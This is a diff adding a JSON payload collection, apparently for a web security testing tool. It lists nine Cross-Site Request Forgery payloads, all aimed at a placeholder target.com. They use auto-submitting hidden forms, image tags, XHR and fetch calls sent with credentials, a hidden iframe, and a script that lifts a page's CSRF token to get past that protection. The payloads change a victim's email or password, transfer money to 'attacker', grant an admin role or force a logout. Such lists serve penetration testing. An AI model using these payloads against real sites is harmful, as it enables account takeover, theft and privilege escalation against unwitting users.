@@ -1,0 +1,177 @@
+{
+    "category": "CSRF",
+    "description": "Cross-Site Request Forgery payloads and templates",
+    "payloads": [
+        {
+            "id": "csrf-form-001",
+            "title": "Auto Submit Form",
+            "payload": "<form action='https://target.com/change-email' method='POST' id='csrf'><input type='hidden' name='email' value='attacker@evil.com'></form><script>document.getElementById('csrf').submit();</script>",
+            "category": "CSRF",
+            "subcategory": "Form-based",
+            "context": [
+                "html",
+                "page"
+            ],
+            "level": "medium",
+            "tags": [
+                "form",
+                "auto",
+                "submit"
+            ],
+            "notes": "Auto-submitting hidden form",
+            "source": "github"
+        },
+        {
+            "id": "csrf-form-002",
+            "title": "Password Change Form",
+            "payload": "<form action='https://target.com/change-password' method='POST'><input type='hidden' name='new_password' value='hacked123'><input type='hidden' name='confirm_password' value='hacked123'></form><script>document.forms[0].submit();</script>",
+            "category": "CSRF",
+            "subcategory": "Form-based",
+            "context": [
+                "html",
+                "page"
+            ],
+            "level": "high",
+            "tags": [
+                "form",
+                "password",
+                "change"
+            ],
+            "notes": "Change victim's password",
+            "source": "github"
+        },
+        {
+            "id": "csrf-img-001",
+            "title": "Image GET Request",
+            "payload": "<img src='https://target.com/delete?id=123'>",
+            "category": "CSRF",
+            "subcategory": "Image-based",
+            "context": [
+                "html",
+                "email"
+            ],
+            "level": "low",
+            "tags": [
+                "img",
+                "get",
+                "delete"
+            ],
+            "notes": "GET request via image tag",
+            "source": "github"
+        },
+        {
+            "id": "csrf-img-002",
+            "title": "Multiple Image Requests",
+            "payload": "<img src='https://target.com/transfer?to=attacker&amount=1000'><img src='https://target.com/transfer?to=attacker&amount=500'>",
+            "category": "CSRF",
+            "subcategory": "Image-based",
+            "context": [
+                "html",
+                "email"
+            ],
+            "level": "medium",
+            "tags": [
+                "img",
+                "get",
+                "transfer"
+            ],
+            "notes": "Multiple CSRF via images",
+            "source": "github"
+        },
+        {
+            "id": "csrf-xhr-001",
+            "title": "XHR POST Request",
+            "payload": "<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/transfer',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.withCredentials=true;xhr.send('to=attacker&amount=1000');</script>",
+            "category": "CSRF",
+            "subcategory": "XHR-based",
+            "context": [
+                "html",
+                "script"
+            ],
+            "level": "high",
+            "tags": [
+                "xhr",
+                "ajax",
+                "post"
+            ],
+            "notes": "AJAX request with credentials",
+            "source": "github"
+        },
+        {
+            "id": "csrf-xhr-002",
+            "title": "Fetch API Request",
+            "payload": "<script>fetch('https://target.com/api/transfer',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'to=attacker&amount=1000'});</script>",
+            "category": "CSRF",
+            "subcategory": "XHR-based",
+            "context": [
+                "html",
+                "script"
+            ],
+            "level": "high",
+            "tags": [
+                "fetch",
+                "api",
+                "post"
+            ],
+            "notes": "Fetch API CSRF",
+            "source": "github"
+        },
+        {
+            "id": "csrf-json-001",
+            "title": "JSON Content Type",
+            "payload": "<script>fetch('https://target.com/api/user',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'{\"role\":\"admin\"}'});</script>",
+            "category": "CSRF",
+            "subcategory": "JSON-based",
+            "context": [
+                "html",
+                "script"
+            ],
+            "level": "high",
+            "tags": [
+                "json",
+                "api",
+                "role"
+            ],
+            "notes": "JSON body with text/plain bypass",
+            "source": "github"
+        },
+        {
+            "id": "csrf-iframe-001",
+            "title": "Hidden iframe",
+            "payload": "<iframe style='display:none' src='https://target.com/logout'></iframe>",
+            "category": "CSRF",
+            "subcategory": "Iframe-based",
+            "context": [
+                "html",
+                "page"
+            ],
+            "level": "low",
+            "tags": [
+                "iframe",
+                "hidden",
+                "logout"
+            ],
+            "notes": "Hidden iframe request",
+            "source": "github"
+        },
+        {
+            "id": "csrf-token-001",
+            "title": "Token Extraction",
+            "payload": "<script>fetch('/profile').then(r=>r.text()).then(html=>{var token=html.match(/csrf_token.*?value=\"([^\"]+)\"/)[1];fetch('/change-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=evil@attacker.com&csrf='+token});});</script>",
+            "category": "CSRF",
+            "subcategory": "Token Bypass",
+            "context": [
+                "html",
+                "script"
+            ],
+            "level": "high",
+            "tags": [
+                "token",
+                "extract",
+                "bypass"
+            ],
+            "notes": "Extract and use CSRF token",
+            "source": "github"
+        }
+    ]
+}
